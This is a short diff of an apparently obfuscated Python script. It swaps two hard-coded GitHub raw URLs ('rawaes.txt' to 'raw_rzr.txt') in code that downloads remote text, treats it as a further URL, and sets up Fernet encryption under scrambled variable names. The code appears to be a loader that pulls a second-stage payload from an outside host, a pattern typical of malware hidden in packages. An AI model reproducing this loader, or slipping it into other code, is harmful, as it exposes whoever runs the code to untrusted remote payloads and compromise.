@@ -74,7 +74,7 @@ except subprocess.CalledProcessError as e:
     print(f"Error: {e}")
 os.system('cls')
 def new_function_name(mycontent):
-    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
+    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/raw_rzr.txt'
 
     crpppttkkyy = Fernet.generate_key()
     cipher_suite = Fernet(crpppttkkyy)
@@ -99,7 +99,7 @@ def new_function_name(mycontent):
     if raw2urlfinalresponse.status_code == 200:  
         content2 =  raw2urlfinalresponse.text
         if True:      
-            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
+            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/raw_rzr.txt'
             rawresponse = requests.get(rawfile_url)
             rawcontent = rawresponse.text
             raw_url = rawcontent
